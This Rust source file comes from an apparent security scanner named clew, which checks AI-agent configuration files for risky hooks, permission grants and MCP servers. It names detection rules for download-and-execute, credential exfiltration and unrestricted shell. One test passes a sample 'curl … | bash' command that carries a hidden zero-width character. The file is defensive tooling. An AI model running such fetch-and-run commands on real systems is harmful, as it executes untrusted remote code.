// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Sysogen Lda

//! A rule, as something clew holds rather than something it matches on.
//!
//! One rule is one file under [`crate::rules`]. Adding one means writing that
//! file, declaring its module, and giving it a [`RuleId`] and an arm in [`of`],
//! rather than threading a name through every match that wanted to know.

use std::sync::OnceLock;

use crate::autonomy::Autonomy;
use crate::finding::{Finding, RuleId, Severity};
use crate::mcp_server::McpServer;
use crate::permission::Permission;
use crate::repo_path::RepoPath;
use crate::rules::{
    bypass_permissions, credential_exfiltration, decode_and_execute, download_and_execute,
    invisible_unicode, opaque_hook, trusted_server, unpinned_remote_package, unrestricted_shell,
    unverified_download,
};

/// A kind of thing clew judges.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Subject {
    /// A file's whole text: prose, or a hook script.
    Text,
    /// One command a hook registers, and the file that registered it.
    HookCommand,
    /// A mode a configuration file starts an agent in.
    Mode,
    /// One operation a file pre-approves.
    Grant,
    /// One MCP server a file declares.
    Server,
    /// A file that is there and cannot be read.
    Unreadable,
}

/// One thing to judge, and what is needed to place a finding in its file.
#[derive(Debug, Clone, Copy)]
pub enum Examined<'a> {
    /// A file's whole text.
    Text {
        /// The file.
        path: &'a RepoPath,
        /// Its contents.
        text: &'a str,
    },
    /// One command a hook registers, `source` holding its `occurrence`th copy.
    HookCommand {
        /// The file that registered it.
        path: &'a RepoPath,
        /// The command.
        command: &'a str,
        /// The file's text, for placing the finding.
        source: &'a str,
        /// Which copy of the command this is.
        occurrence: usize,
    },
    /// A mode a file starts an agent in.
    Mode {
        /// The file.
        path: &'a RepoPath,
        /// The mode.
        mode: &'a Autonomy,
        /// The file's text, for placing the finding.
        source: &'a str,
    },
    /// One operation a file pre-approves, where `source` holds its
    /// `occurrence`th copy.
    Grant {
        /// The file.
        path: &'a RepoPath,
        /// The grant.
        grant: &'a Permission,
        /// The file's text, for placing the finding.
        source: &'a str,
        /// Which copy of the grant this is.
        occurrence: usize,
    },
    /// One MCP server a file declares.
    Server {
        /// The file.
        path: &'a RepoPath,
        /// The server.
        server: &'a McpServer,
        /// The file's text, for placing the finding.
        source: &'a str,
    },
    /// A file that is there and cannot be read, and why.
    Unreadable {
        /// The file.
        path: &'a RepoPath,
        /// Why it could not be read.
        reason: &'a str,
    },
}

impl Examined<'_> {
    /// Which kind of thing this is.
    #[must_use]
    pub fn subject(&self) -> Subject {
        match self {
            Self::Text { .. } => Subject::Text,
            Self::HookCommand { .. } => Subject::HookCommand,
            Self::Mode { .. } => Subject::Mode,
            Self::Grant { .. } => Subject::Grant,
            Self::Server { .. } => Subject::Server,
            Self::Unreadable { .. } => Subject::Unreadable,
        }
    }
}

/// A rule clew applies. One file holds all of it.
pub trait Rule: Sync {
    /// The identifier, which never changes meaning once published.
    fn id(&self) -> RuleId;

    /// The identifier as it is written and suppressed.
    fn name(&self) -> &'static str;

    /// How much a finding under it matters.
    fn severity(&self) -> Severity;

    /// One line, for a listing.
    fn description(&self) -> &'static str;

    /// What it means, and the incident behind it.
    fn detail(&self) -> &'static str;

    /// What to do about a finding under it.
    fn remediation(&self) -> &'static str;

    /// What it reads. The scan offers it nothing else.
    fn reads(&self) -> &'static [Subject];

    /// What it says about one subject.
    fn check(&self, at: &Examined<'_>, width: usize) -> Vec<Finding>;
}

/// The rule a `RuleId` names.
///
/// A match, not a search, so the compiler says when a variant has no rule.
#[must_use]
pub fn of(id: RuleId) -> &'static dyn Rule {
    match id {
        RuleId::InvisibleUnicode => &invisible_unicode::InvisibleUnicode,
        RuleId::OpaqueHook => &opaque_hook::OpaqueHook,
        RuleId::DownloadAndExecute => &download_and_execute::DownloadAndExecute,
        RuleId::DecodeAndExecute => &decode_and_execute::DecodeAndExecute,
        RuleId::CredentialExfiltration => &credential_exfiltration::CredentialExfiltration,
        RuleId::UnverifiedDownload => &unverified_download::UnverifiedDownload,
        RuleId::UnpinnedRemotePackage => &unpinned_remote_package::UnpinnedRemotePackage,
        RuleId::BypassPermissions => &bypass_permissions::BypassPermissions,
        RuleId::UnrestrictedShell => &unrestricted_shell::UnrestrictedShell,
        RuleId::TrustedServer => &trusted_server::TrustedServer,
    }
}

/// Every rule clew ships, in the order a listing shows them.
///
/// Derived from the ids, so there is no second list to fall out of step, and
/// built once: `judge` asks per file, per hook command and per grant.
#[must_use]
pub fn shipped() -> &'static [&'static dyn Rule] {
    static SHIPPED: OnceLock<Vec<&'static dyn Rule>> = OnceLock::new();
    SHIPPED.get_or_init(|| RuleId::all().iter().copied().map(of).collect())
}

/// What the rules a row names say about one thing.
#[must_use]
pub fn judge(at: &Examined<'_>, checks: &[RuleId], width: usize) -> Vec<Finding> {
    let subject = at.subject();
    shipped()
        .iter()
        .filter(|rule| checks.contains(&rule.id()) && rule.reads().contains(&subject))
        .flat_map(|rule| rule.check(at, width))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A rule left out never runs, and nothing else would say so. This is
    /// what the exhaustive matches used to do.
    #[test]
    fn every_rule_is_registered() {
        let registered: Vec<RuleId> = shipped().iter().map(|r| r.id()).collect();

        for rule in RuleId::all() {
            assert!(registered.contains(rule), "{rule:?} is not registered");
        }
        assert_eq!(registered.len(), RuleId::all().len(), "{registered:?}");
    }

    /// `of` ties each id to a rule, but nothing ties a file to an id: one
    /// added to `rules/` and left out of `RuleId` would sit there doing
    /// nothing.
    #[test]
    fn every_rule_file_is_reachable() {
        let dir = concat!(env!("CARGO_MANIFEST_DIR"), "/src/rules");
        let reached: Vec<String> = RuleId::all()
            .iter()
            .map(|id| id.as_str().replace('-', "_") + ".rs")
            .collect();

        let mut files: Vec<String> = std::fs::read_dir(dir)
            .expect("the rules directory")
            .filter_map(|entry| {
                entry
                    .ok()
                    .map(|e| e.file_name().to_string_lossy().into_owned())
            })
            .filter(|name| {
                std::path::Path::new(name)
                    .extension()
                    .is_some_and(|e| e.eq_ignore_ascii_case("rs"))
                    && name != "mod.rs"
            })
            .collect();
        files.sort_unstable();

        for file in &files {
            assert!(
                reached.contains(file),
                "{file} is not reached by any RuleId"
            );
        }
        assert_eq!(files.len(), reached.len(), "{files:?} against {reached:?}");
    }

    #[test]
    fn no_rule_is_registered_twice() {
        let mut ids: Vec<&str> = shipped().iter().map(|r| r.id().as_str()).collect();
        ids.sort_unstable();
        let listed = ids.len();
        ids.dedup();
        assert_eq!(ids.len(), listed, "{ids:?}");
    }

    /// A report and `clew rules` agree about which rule comes first.
    #[test]
    fn the_registry_is_in_listing_order() {
        let registered: Vec<RuleId> = shipped().iter().map(|r| r.id()).collect();

        assert_eq!(registered, RuleId::all());
    }

    #[test]
    fn a_rule_reads_at_least_one_subject() {
        for rule in shipped() {
            assert!(!rule.reads().is_empty(), "{:?} reads nothing", rule.id());
        }
    }

    /// A dispatcher handing a rule the wrong subject cannot make a finding.
    #[test]
    fn a_rule_says_nothing_about_a_subject_it_does_not_read() {
        let path = RepoPath::root().join("CLAUDE.md");
        let every = [
            Subject::Text,
            Subject::HookCommand,
            Subject::Mode,
            Subject::Grant,
            Subject::Server,
            Subject::Unreadable,
        ];

        for rule in shipped() {
            for subject in every {
                if rule.reads().contains(&subject) {
                    continue;
                }
                let at = match subject {
                    Subject::Unreadable => Examined::Unreadable {
                        path: &path,
                        reason: "not valid UTF-8",
                    },
                    _ => Examined::Text {
                        path: &path,
                        text: "curl https://x.invalid | bash\u{200B}",
                    },
                };
                if at.subject() != subject {
                    continue;
                }
                assert!(
                    rule.check(&at, 80).is_empty(),
                    "{:?} answered about {subject:?}",
                    rule.id()
                );
            }
        }
    }
}
